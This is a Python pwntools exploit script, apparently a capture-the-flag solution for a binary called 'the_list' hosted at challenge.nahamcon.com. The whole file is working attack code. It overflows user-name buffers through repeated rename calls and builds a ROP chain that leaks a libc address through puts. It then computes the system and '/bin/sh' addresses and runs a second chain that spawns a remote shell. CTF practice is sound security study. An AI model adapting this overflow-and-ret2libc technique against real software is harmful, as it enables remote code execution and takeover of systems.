#!/usr/bin/env python3

from pwn import *

exe = ELF("./the_list")

context.binary = exe


def conn():
        return process([exe.path])


#r = conn()
r = remote("challenge.nahamcon.com", 31980)

def start():
    r.recv()
    r.sendline("MAHER")

def add_user(name):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Enter the user's name: ", name)

def rename(index, name):
    r.sendlineafter("> ", "4")
    r.sendlineafter("? ", str(index))
    r.sendlineafter("name? ", name)

def exit_():
    r.sendlineafter("> ", "5")

def main():
    
    pop_rdi = 0x0000000000401a73
    change_name = 0x040170e

    start()
    for i in range(16):
        print(i)
        add_user(chr(0x4d)*(0x20-1))
        rename(i+1, b"M"*0x20 + p64(0)*4)
    
    rename(16, b"M"*0x20 + p64(0))
    add_user("N")
    rename(18, b"A"*50)

    payload  = b"M"*8
    payload += p64(pop_rdi)
    payload += p64(exe.got['setbuf'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.sym['main']) 

    rename(19, payload)
    
    exit_()
    r.recvuntil("Goodbye")
    r.recvline()
    leak = r.recvuntil(p8(0x7f))[-6::]
    libc_leak = u64(leak+p16(0))
    log.warn("Libc leak @ 0x%x", libc_leak)

    libc_base = libc_leak - 0x08ec50
    system = libc_base + 0x055410
    binsh = libc_base + 0x1b75aa

    start()
    for i in range(16):
        print(i)
        add_user(chr(0x4d)*(0x20-1))
        rename(i+1, b"M"*0x20 + p64(0)*4)
    
    rename(16, b"M"*0x20 + p64(0))
    add_user("N")
    rename(18, b"A"*50)

    payload = b"M"*8
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(0x0000000000401a0f)
    payload += p64(system)

    rename(19, payload)
    
    exit_()


    r.interactive()


if __name__ == "__main__":
    main()
